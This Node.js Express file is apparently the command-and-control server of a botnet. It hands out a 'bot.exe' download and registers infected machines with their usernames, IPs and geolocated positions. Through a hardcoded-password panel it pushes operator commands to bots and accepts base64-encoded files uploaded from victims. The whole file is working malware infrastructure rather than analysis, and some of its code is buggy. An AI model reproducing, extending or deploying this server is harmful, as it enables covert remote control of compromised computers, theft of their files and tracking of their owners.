const fs = require('fs') 
var http = require("http");
var express = require("express");
var app = express();
var bodyParser = require("body-parser");
var os = require("os");
var urlencodedParser = bodyParser.urlencoded({ extended: true });
var cookieParser = require('cookie-parser');
var multer = require('multer');
var upload = multer(); 
var session = require('express-session');
var MongoClient = require('mongodb').MongoClient;
var url = "mongodb://localhost:27017/";

var request = require('request');

var rawBodySaver = function (req, res, buf, encoding) {
  if (buf && buf.length) {
    req.rawBody = buf.toString(encoding || 'utf8');
  }
}



app.use(bodyParser.json({ limit: '50mb', verify: rawBodySaver, extended: true }));
app.use(bodyParser.urlencoded({ limit: '50mb',verify: rawBodySaver, extended: true }));
app.use(bodyParser.raw({limit: '50mb', verify: rawBodySaver, type: function () { return true } }));
app.use(upload.array());
app.use(cookieParser());
app.use(session({secret: "yayayay"}));

function h2a(str1)
 {
	 let buff = new Buffer(str1, 'base64');  
	 let str = Buffer.from(str1,'base64');
	 return toString(str);
 }

let lflag = 0;

let random_k = 9;
 
// Running Server Details.
var server = app.listen(8082, function () {
  var host = server.address().address
  var port = server.address().port
  console.log("Example app listening at %s:%s Port", host, port)
});

var crypto = require('crypto');

var Users = [{id: 'letmein'}];

var generate_key = function() {
    var sha = crypto.createHash('sha256');
    sha.update(Math.random().toString());
    return sha.digest('hex');
};



let quotes = ['Don\'t miss the details','Code :: Life','May there be peace','The most ignorant are the most wisest','Let the war begin','... ?','So, what is it gonna be ?','It\'s all an illusion']; 

app.use(express.static(__dirname + '/public'));

app.disable('x-powered-by');

app.set('view engine', 'jade');

sessionso = []

app.get('/l', urlencodedParser, function (req, res){
	 res.render('l');
	});
app.get('/bot', urlencodedParser, function (req, res){
	 res.sendfile('bot.exe');
	});
	 
app.get('/commands', function(req, res){
	if(req.session.user){
	res.render('commands');}
	else{res.render('404');}
});
app.get('/logout', function(req, res){
	if(req.session.user){
	req.session.destroy(function(){
   });
   res.redirect('/');
	}
	else{res.render('404');}
});

l = [];

app.get('/bots', function(req, res){
	if(req.session.user){
	let r = "";
	MongoClient.connect(url, function(err, db) {
		if (err) throw err;
		console.log("Connected to mongodb for showing bots");
		//parameters sent are consolename, username
		
		let dbo = db.db("h0");
		dbo.collection("bots").find({}).toArray(function(err, result) {
			if (err) throw err;
			let r = result;
			res.render('bots',{result:r, locate:l});
			db.close();
		});
	});		
	}
	else{res.render('404');}
});

app.get('/', function(req, res){
	if(req.session.user){
	res.render('index', {hello: quotes[Math.floor(Math.random() * 10)]});}
	else{res.render('404');}
});

app.post('/', function(req, res){
   console.log(Users);
   if(!req.body.key1){
      res.render('404');
   } else {
      Users.filter(function(user){
         if(user.id === req.body.key1){
			console.log(user);
            req.session.user = user;
			console.log(req.session);
			console.log('hi');
            res.render('index', {hello: quotes[Math.floor(Math.random() * 10)]});
         }
		 else{res.render('404');}
      });
   }
});

app.post('/darude', urlencodedParser, function (req, res){
	restr = Buffer.from(req.rawBody, 'ascii').toString('ascii');
	restr = JSON.parse(restr);
	if(restr.p == "swipernoswiping"){
	let j = fs.readFileSync('views/darude', 'utf8');
	res.send(j);}
	else{
	console.log(req.body);
	res.send("Fuck away");
	}
});

 
 app.post('/commands', urlencodedParser, function (req, res){
  if(req.session.user){
  var reply='';
  reply += req.body.com;
  fs.writeFile('views/darude', reply);
  reply += '\n';
  fs.appendFile('n.txt', reply);
  res.render('commands', {hello: 'Command \'' + req.body.com + '\' sent successfully.'} );
	}
  else{
	  res.send("... ?");
  }
 });
 
  app.post('/c', function(req, res) {
  var data = new Buffer('');
    req.on('data', chunk => {
    console.log(`Data chunk available: ${chunk}`)
  });
  req.on('data', function(chunk) {
      data = Buffer.concat([data, chunk]);
  });
  req.on('end', function() {
    req.rawBody = data;
  });
  restr = Buffer.from(req.rawBody, 'ascii').toString('ascii');
  console.log(restr);
  restr = JSON.parse(restr);
  fs.writeFile(restr.name, Buffer.from(restr.file, 'base64'), "binary", function(err) { });
  res.send("Success");
  console.log('File Saved --> ' + restr.name);
});

app.post('/reg',function(req,res){
	MongoClient.connect(url, function(err, db) {
	  if (err) throw err;
	  console.log("Connected to mongodb");
	  //parameters sent are consolename, username
	  restr = Buffer.from(req.rawBody, 'ascii').toString('ascii');
	  console.log(restr);
	  restr = JSON.parse(restr);
	  let dbo = db.db("h0");
	  request('http://ip-api.com/json/' + restr.ip, function (error, response, body) {
			  if (!error && response.statusCode == 200) {
				body = JSON.parse(body);
				let loc = body.regionName + "/" + body.city;
				var datetime = new Date();
				let newdata = {consolename:restr.consolename, username:restr.username,ip:req.ip,location:loc, registered_time:datetime};
				dbo.collection("bots").insertOne(newdata, function(err, res) {
				if (err) throw err;
				  console.log(newdata);
				  db.close();
				});
			  }
			});

	});
	res.send("bot added");
});
app.get('/p', function(req, res) {
  fs.appendFile("logsdata.txt",req.query);
  console.log(req.query);
  res.send("<scr'" + '+' + "'ipt>alert('LOLOL');</scr'" + '+' + "'ipt>");
});
 
 app.use(function(req,res){
    res.status(404).render('404.jade');
});
 
 module.exports = app;
 module.exports = lflag;